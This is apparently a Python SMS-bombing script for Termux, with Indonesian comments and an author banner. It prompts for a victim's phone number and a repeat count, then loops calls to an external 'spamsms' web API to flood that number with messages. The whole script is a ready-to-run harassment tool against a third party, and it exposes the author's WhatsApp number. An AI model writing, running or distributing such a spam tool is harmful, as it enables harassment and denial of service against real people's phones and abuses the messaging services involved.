# jangan lupa subscribe MisterAM
# Sepesial idul fitri
# sceipt gua kagak pernah gua encriypt ngab

#jangan ubah
import requests,os,sys,time
from time import sleep
#kalo biaa jangan di ubah :v
os.system('clear')
print ('\033[36;1mFollow Github Ku dulu Kak ! (. ❛ ᴗ ❛.)')
os.system('termux-open-url https://github.com/kannachann')
sleep(5)
os.system('clear')
print ('\033[36;1mLOADING...')
sleep(3)
os.system('clear')
# Ubah Terserah kalian ngab
banner= """

\033[37;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[37;1m███████╗███╗   ███╗███████╗
\033[37;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[37;1m██╔════╝████╗ ████║██╔════╝
\033[37;1m ███████╗██████╔╝███████║██╔████╔██║ \033[37;1m███████╗██╔████╔██║███████╗
\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m╚════██║██║╚██╔╝██║╚════██║
\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m███████║██║ ╚═╝ ██║███████║
\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m╚══════╝╚═╝     ╚═╝╚══════╝
\033[37;1m                              BY LETTA SAMA 🐰
\033[37;1m❏
\033[36;1m┊ \033[37;1m🐰 Authour : Kannachann
\033[36;1m┊ \033[37;1m🐰 gitHub  : https:github.com/kannachann
\033[36;1m┊ \033[37;1m🐰 Whatsapp: wa.me/62831433937633
\033[36;1m┗═────────···
\033[36;1m
\033[36;1m❏ 📮 NOTE:
\033[36;1m┊\033[37;1m Gunakan Script Ini dengan baik
\033[36;1m┊\033[37;1m Jangan Lupa Kasih Star dan follow Yaw ( /^ω^)/♪♪
\033[36;1m┗═────────···"""
sleep(1)
print(banner)

# Jangan lu ubah ngab
print ('\033[31;1m \033[32;1mContoh nomor : \033[33;1m8xxxxxxx')

nomor = input(' \033[36;1m💬 Masukan Nomor :\033[33;1m ')
print ('\033[32;1m- - - JUMLAH SPAM - - -')
print ('')
jm = int(input('\033[31;1m💬 Jumlah Spam :\033[33;1m '))

for i in range(jm):
      req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
      if "mengirim" in req:
            print ('\n \033[37;1m[\033[32;1m√\033[37;1m]\033[32;1mMengirim spam...')
      else:
            print ('\n \033[37;1m[\033[33;1m•••\033[37;1m]\033[36;1mMencoba Mengirim spam...')


# Follow Kannachann
